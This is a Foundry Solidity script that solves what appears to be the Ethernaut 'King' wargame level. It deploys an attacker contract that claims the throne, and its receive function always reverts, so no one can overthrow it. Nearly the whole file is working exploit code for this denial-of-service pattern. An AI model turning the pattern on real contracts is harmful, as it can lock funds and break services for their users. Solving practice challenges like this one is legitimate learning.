// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../contracts/9King.sol";
import "forge-std/Script.sol";

contract KingAttack is Script {
    function run() public {
        vm.startBroadcast();
        King targetContract = King(payable(0x7745Cd206EC14e4cd31b0710C027476F8F34Db4e));
        uint256 prize = targetContract.prize();
        console.log(prize);
        // below is correct solution however it is sent from our wallet, such that our wallet will
        // be set the king and be able to be overthrown when the challenge instance is submitted
        // Our null receive function does not trigger as our wallet will always be able to receieve funds
        // payable(address(targetContract)).send(prize + 1);

        // Instead we need to create an attacking contract to be our proxy king
        //  The prize is 1 eth which is more goerli eth than Ive ever had so we can only do it locally
        vm.deal(msg.sender, 2 ether);

        KingAttacker attacker = new KingAttacker{value: prize+1}(payable(address(targetContract)));
        attacker.attack();
        console.log(address(attacker));
        console.log(targetContract._king());
        vm.stopBroadcast();
    }
}

contract KingAttacker {
    address target;

    constructor(address targetAddress) payable {
        target = targetAddress;
        // payable(address(targetAddress)).send(address(this).balance);
    }

    function attack() public {
        console.log(address(this).balance);
        payable(address(target)).send(address(this).balance);
    }

    // This require will never run successfully so we cannot be overthrown
    receive() external payable {
        require(false, "cannot claim my throne!");
    }
}
